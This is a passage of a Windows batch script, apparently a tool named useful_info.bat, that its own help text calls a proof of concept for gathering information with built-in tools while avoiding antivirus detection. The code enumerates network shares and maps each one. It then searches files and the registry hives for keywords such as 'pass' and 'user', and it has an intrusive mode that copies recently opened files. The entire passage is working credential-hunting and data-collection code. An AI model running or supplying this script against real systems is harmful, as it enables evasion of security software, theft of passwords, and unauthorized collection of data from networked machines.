				IF !SCAVENGED_PATH!==\\ SET SCAVENGED_PATH=
				
				REM Enumerate Shares on Root of Server (CAUSE 53 DUE TO FIRST_SCAVENGED_PATH)
				FOR /F "usebackq tokens=1* skip=7" %%P IN (`NET VIEW !FIRST_SCAVENGED_PATH!`) DO (
					REM Skip last word
					IF NOT "%%P"=="The" (
						FIND /I "!FIRST_SCAVENGED_PATH!\%%P\" !TOOL_DIR!\tmp\tmp_scavenged_mapped_drive_unc.txt >NUL 2>&1
						FIND /I "!FIRST_SCAVENGED_PATH!\%%P\" !TOOL_DIR!\tmp\tmp_scavenged_mapped_drive_unc.txt >NUL 2>&1

						REM If path not stored in file
						IF !ERRORLEVEL!==1 (
							ECHO !FIRST_SCAVENGED_PATH!\%%P\>> !TOOL_DIR!\tmp\tmp_scavenged_mapped_drive_unc.txt >NUL 2>&1
						)
					)
				)

				CALL :TRIM !SCAVENGED_PATH! SCAVENGED_PATH
				FIND /I "!SCAVENGED_PATH!\" !TOOL_DIR!\tmp\tmp_scavenged_mapped_drive_unc.txt >NUL 2>&1

				REM If path not stored in file
				IF !ERRORLEVEL!==1 (
					ECHO !SCAVENGED_PATH!\>> !TOOL_DIR!\tmp\tmp_scavenged_mapped_drive_unc.txt
				)
			)
		)
	)
)

REM Traverse Mapped Drive UNC
SET MSG=Instrusive Search - Scavenged Drives UNC
SET UNC_FILE=!TOOL_DIR!\tmp\tmp_scavenged_mapped_drive_unc.txt
CALL :UNC_SETUP

EXIT /B

:SEARCH_REGISTRY
SET MESSAGE=Searching Registry
SET MSG=Depending the number of entries in a Registry this might take awhile.
CALL :SPINNER
SET REG_LOC=HKLM HKCU HKU

FOR %%A IN (%REG_LOC%) DO (
	SET KEY_LOCATION=\
	DEL !FOLDER_PATH!\export_reg_%%A_search.txt 2>NUL

	FOR %%B IN (%SEARCH_STR%) DO (
		SET MSG=Searching for %%B
		CALL :SPINNER
		ECHO. >> !FOLDER_PATH!\registry\export_reg_%%A_search.txt 2>NUL
		ECHO Results for: %%B >> !FOLDER_PATH!\registry\export_reg_%%A_search.txt 2>NUL
		ECHO.  >> !FOLDER_PATH!\registry\export_reg_%%A_search.txt 2>NUL
		FOR /f "delims=" %%C IN ('REG QUERY "%%A" /s ^| FIND /I "%%B"') DO (
			SET CURRENT_FILE_LOCATION=%%C
			REM Folders to Skip
			ECHO !CURRENT_FILE_LOCATION!|FINDSTR /C:"HKEY" 2>NUL
			IF NOT ERRORLEVEL 1 (
			   REM Stores Key Location for Values
			   SET KEY_LOCATION=!CURRENT_FILE_LOCATION! 2>NUL
			) ELSE (
				ECHO !KEY_LOCATION! >> !FOLDER_PATH!\registry\export_reg_%%A_search.txt 2>NUL
				ECHO !CURRENT_FILE_LOCATION! >> !FOLDER_PATH!\registry\export_reg_%%A_search.txt 2>NUL
			)
		)
	)
)

REM Search for IP Address
ECHO. >> !FOLDER_PATH!\registry\export_reg_HKCU_search.txt 2>NUL
ECHO Results for: IP ADDRESS Search >> !FOLDER_PATH!\registry\export_reg_HKCU_search.txt 2>NUL
ECHO.  >> !FOLDER_PATH!\registry\export_reg_HKCU_search.txt 2>NUL
REG QUERY "HKCU" /S | find /I "." | FINDSTR /I "[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*" >> !FOLDER_PATH!\registry\export_reg_HKCU_search.txt 2>NUL

EXIT /B

:UNC_SETUP
FOR /F "usebackq tokens=*" %%A IN (`TYPE !UNC_FILE!`) DO (
	SET UNC_PATH=%%~dpA

	REM Set Domain Name
	FOR /F "usebackq tokens=1 delims=\" %%B IN (`ECHO !UNC_PATH! `) DO (
		SET FULLY_QUALIFIED_DOMAIN_NAME=%%B
	)

	REM Set Folder Name
	FOR /F "usebackq tokens=2 delims=\" %%C IN (`ECHO !UNC_PATH! `) DO (
		IF NOT "%%C"==" " (
			CALL :TRIM %%C FOLDER_NAME & CALL :MAP_NETWORK_DRIVE
		) ELSE (
		SET FOLDER_NAME=
		CALL :MAP_NETWORK_DRIVE
		)
	)
)
EXIT /B

:MAP_NETWORK_DRIVE
SET MSG=Mapping \\!FULLY_QUALIFIED_DOMAIN_NAME!\!FOLDER_NAME!
CALL :SPINNER
FOR %%A IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO (
	REM Use if password protected
	REM ECHO | NET USE %%A: \\!FULLY_QUALIFIED_DOMAIN_NAME!\!FOLDER_NAME! > !TOOL_DIR!\tmp\tmp_mapped_drive_errors.txt 2>&1
	NET USE %%A: \\!FULLY_QUALIFIED_DOMAIN_NAME!\!FOLDER_NAME! > !TOOL_DIR!\tmp\tmp_mapped_drive_errors.txt 2>&1
	CALL :TRIM %%A CURRENT_DRIVE

	IF !ERRORLEVEL!==0 (
		REM Check if folder is accessible
		CD %%A: > !TOOL_DIR!\tmp\tmp_change_drive_errors.txt 2>&1
		FOR /F "usebackq tokens=*" %%B IN (`TYPE !TOOL_DIR!\tmp\tmp_change_drive_errors.txt ^| FIND "Access is denied."`) DO (
			NET USE !CURRENT_DRIVE!: /DELETE /Y >NUL
			EXIT /B
		)
		
		REM System Error.
		FOR /F "usebackq tokens=*" %%B IN (`TYPE !TOOL_DIR!\tmp\tmp_mapped_drive_errors.txt ^| FIND "System error"`) DO (
			NET USE !CURRENT_DRIVE!: /DELETE /Y >NUL
			EXIT /B
		)
		
		REM If folder accessible
		CALL :NETWORK_SEARCH_FILES
		EXIT /B
	)

	REM Check if Drive is already in use
	FINDSTR /I "already in use" !TOOL_DIR!\tmp\tmp_mapped_drive_errors.txt

	IF !ERRORLEVEL!==1 (
		REM System Error.
		TYPE !TOOL_DIR!\tmp\tmp_mapped_drive_errors.txt | FINDSTR /I "already in use" >NUL 2>&1
		FOR /F "usebackq tokens=*" %%B IN (`TYPE !TOOL_DIR!\tmp\tmp_mapped_drive_errors.txt ^| FIND "System error"`) DO (
			NET USE !CURRENT_DRIVE!: /DELETE /Y >NUL
			EXIT /B
		)
		
		REM Share needs password.
		FOR /F "usebackq tokens=*" %%B IN (`TYPE !TOOL_DIR!\tmp\tmp_mapped_drive_errors.txt ^| FIND "password"`) DO (
			NET USE !CURRENT_DRIVE!: /DELETE /Y >NUL
			EXIT /B
		)
		CALL :NETWORK_SEARCH_FILES
	)
)

EXIT /B

:NETWORK_SEARCH_FILES
SET NEW_FILE_TYPE=

REM Add the file to be keyword searched
FOR %%A IN (%FILE_TYPE%) DO (
	SET NEW_FILE_TYPE=!NEW_FILE_TYPE! *.%%A
)

REM Add the file not to be keyword searched
FOR %%A IN (%FILE_TYPE_NO_KEYWORD_SEARCH%) DO (
	SET NEW_FILE_TYPE=!NEW_FILE_TYPE! *.%%A
)
SET MSG=Scanning !CURRENT_DRIVE!: - Depending the number of files in a directory this might take awhile.
CALL :SPINNER

FOR /F "usebackq tokens=*" %%C IN (`CD /D !CURRENT_DRIVE!: ^& DIR !NEW_FILE_TYPE! /S /B /A`) DO (
	CALL :GET_SHORT_NAME %%C
	SET FOLDER_PATH=!TOOL_DIR!\info\!FULLY_QUALIFIED_DOMAIN_NAME!
	SET ORIG_FILE_LOCATION=\\!FULLY_QUALIFIED_DOMAIN_NAME!\!FOLDER_NAME!
	SET ORIG_FILE_LOCATION=!ORIG_FILE_LOCATION!\!SHORT_NAME:~4!
	CALL :CHECK_IF_FILE_EXCLUDED !SHORT_NAME!
)

REM Disconnect Drive
NET USE !CURRENT_DRIVE!: /DELETE /Y >NUL
EXIT /B

:SPINNER
SET THESPINNER=%THESPINNER%.
IF %THESPINNER%'==..................................' SET THESPINNER=.
CLS
ECHO ===============================================================================
ECHO %MESSAGE%
ECHO ===============================================================================
ECHO.
ECHO Please wait:
ECHO !MSG!
ECHO.
ECHO %WARNING%
ECHO.
ECHO %THESPINNER%
EXIT /B

:TRIM
SET %2=%1
EXIT /B

:CHECK_SCAVENGE_INFO
SET VALID_CHAR_FOUND=n
CALL :CALC_STRING_LENGTH !FOUND_UNC!

IF !STRING_LENGTH! EQU 0 SET FOUND_UNC=\\ & EXIT /B

REM If string has only 1 char this is invalid, also stops loop
FOR /F "usebackq tokens=1 delims=\" %%I IN (`ECHO "!FOUND_UNC!"`) DO (

	REM If string is not \\ it is a malformed UNC path possible a drive mapping I.E C:\
	IF "!CHECK_NUMBER!"=="1 " (
		SET CHECK_A=!ORIG_FOLDER_UNC:~0,2!
		IF !CHECK_A!==\\ SET FOUND_UNC=!ORIG_FOLDER_UNC! & EXIT /B
		IF NOT !CHECK_A!==\\ SET FOUND_UNC=!FOUND_UNC:~1! & SET CHECK_NUMBER=2 & CALL :CHECK_SCAVENGE_INFO !FOUND_UNC! FOUND_UNC
	)

	IF "!CHECK_NUMBER!"=="2 " (
		SET CHECK_A=!FOUND_UNC:~0,2!
		IF NOT !CHECK_A!==\\ SET FOUND_UNC=!FOUND_UNC:~1! & CALL :CHECK_SCAVENGE_INFO !FOUND_UNC! FOUND_UNC
		IF !CHECK_A!==\\ (
			REM Set to stop loop
			SET CHECK_A=

			IF !FOUND_UNC!==\\ SET FOUND_UNC=!ORIG_FOLDER_UNC!

			CALL :LOWER_CASE !FOUND_UNC!
			SET CHECK_B=!FOUND_UNC:~2,1!

			REM Parameters can cause issues this will null. I.E %%a when echoed is C:\Docs\blah\
			CALL :CALC_STRING_LENGTH !FOUND_UNC!
			IF !STRING_LENGTH! EQU 2 SET FOUND_UNC=\\ & EXIT /B
			IF !STRING_LENGTH! EQU 3 SET FOUND_UNC=\\ & EXIT /B

			REM Check hostname starts with these chars
			FOR %%A IN (a b c d e f g h i j k l m n o p q r s t u v w x y z 1 2 3 4 5 6 7 8 9 0 ) DO (
				IF !CHECK_B!==%%A SET VALID_CHAR_FOUND=y
			)
			IF NOT !VALID_CHAR_FOUND!==y SET FOUND_UNC=\\ & EXIT /B
			EXIT /B
		)
	)
)
EXIT /B

:CALC_STRING_LENGTH
REM Calculate string length
SET #=%1
SET STRING_LENGTH=0

:STRING_LOOP
IF DEFINED # (
    REM shorten string by one character
    SET #=%#:~1%
    REM increment the string count variable %STRING_LENGTH%
    SET /A STRING_LENGTH += 1
    REM repeat until string is null
    GOTO STRING_LOOP
)

EXIT /B

:LOWER_CASE
SET CASE_STRING=%1
CALL :MAKE_LOWER_CASE CASE_STRING
SET FOUND_UNC=!CASE_STRING!
EXIT /B

:GET_SHORT_NAME
SET SHORT_NAME=%~s1

:MAKE_LOWER_CASE
REM Subroutine to convert a variable VALUE to all lower case.
REM The argument for this subroutine is the variable NAME.
SET %~1=!%1:A=a!
SET %~1=!%1:B=b!
SET %~1=!%1:C=c!
SET %~1=!%1:D=d!
SET %~1=!%1:E=e!
SET %~1=!%1:F=f!
SET %~1=!%1:G=g!
SET %~1=!%1:H=h!
SET %~1=!%1:I=i!
SET %~1=!%1:J=j!
SET %~1=!%1:K=k!
SET %~1=!%1:L=l!
SET %~1=!%1:M=m!
SET %~1=!%1:N=n!
SET %~1=!%1:O=o!
SET %~1=!%1:P=p!
SET %~1=!%1:Q=q!
SET %~1=!%1:R=r!
SET %~1=!%1:S=s!
SET %~1=!%1:T=t!
SET %~1=!%1:U=u!
SET %~1=!%1:V=v!
SET %~1=!%1:W=w!
SET %~1=!%1:X=x!
SET %~1=!%1:Y=y!
SET %~1=!%1:Z=z!

EXIT /B

:HELP
ECHO.
ECHO Description:
ECHO This script is a proof of concept showing that Windows Batch can be
ECHO used to capture useful information using built-in Windows tools
ECHO without triggering Anti-Virus.
ECHO.
ECHO Search for certain file types on the local computer then save them
ECHO.
ECHO useful_info.bat [/a] [/b] [/c] [/d] [/f] [/i] [/k] [/s]
ECHO.
ECHO.  /a			Run script with no questions.
ECHO.
ECHO.  /b			Set file size to search for in bytes.
ECHO.  "1000"		Specifies the text string for the file size.
ECHO.
ECHO.  /c			Copy files which are found.
ECHO.
ECHO.  /d			Directory to store files. By default the root drive
ECHO.			where the script is ran, a folder called tools is made.
ECHO.  "C:\tools"		Specifies the text string for the directory store.
ECHO.
ECHO.  /f			Set the files types to be search.
ECHO.  "bat txt"		Specifies the text string for the file type.
ECHO.
ECHO.  /i			Intrusive option will attempt to copy files which have
ECHO.			been recently opened.
ECHO.
ECHO.  /k			Search file for keywords using default value. This is
ECHO.			automaticly set if using /s
ECHO.  Default Keywords:	%SEARCH_STR%
ECHO.
ECHO.  /s			Set the search string to be search.
ECHO.  "pass user \\"	Specifies the text string for the search string.

GOTO EOF

:EOF
EXIT /B
